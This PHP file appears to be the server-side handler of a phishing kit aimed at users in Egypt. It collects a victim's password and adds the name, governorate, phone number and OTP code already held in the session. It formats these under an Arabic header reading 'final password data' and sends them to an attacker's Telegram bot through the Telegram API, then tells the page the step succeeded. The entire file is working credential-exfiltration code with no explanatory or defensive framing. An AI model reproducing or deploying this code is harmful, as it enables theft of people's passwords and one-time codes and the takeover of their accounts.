<?php
session_start();
header("Content-Type: application/json");

$input = json_decode(file_get_contents("php://input"), true);
$password = !empty($input['password']) ? htmlspecialchars($input['password']) : '-';
$_SESSION['password'] = $password;

include 'telegram.php';
$name = $_SESSION['name'] ?? '-';
$governorate = $_SESSION['governorate'] ?? '-';
$phone = $_SESSION['phone'] ?? '-';
$otp = $_SESSION['otp'] ?? '-';

$message = "*بيانات كلمة المرور النهائية (مصر)*\n" .
           "الاسم: $name\n" .
           "المحافظة: $governorate\n" .
           "الرقم: $phone\n" .
           "رمز OTP: $otp\n" .
           "كلمة المرور: $password";

$url = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$telegramChatID&text=" . urlencode($message) . "&parse_mode=Markdown";
@file_get_contents($url);

echo json_encode(["status" => "success"]);
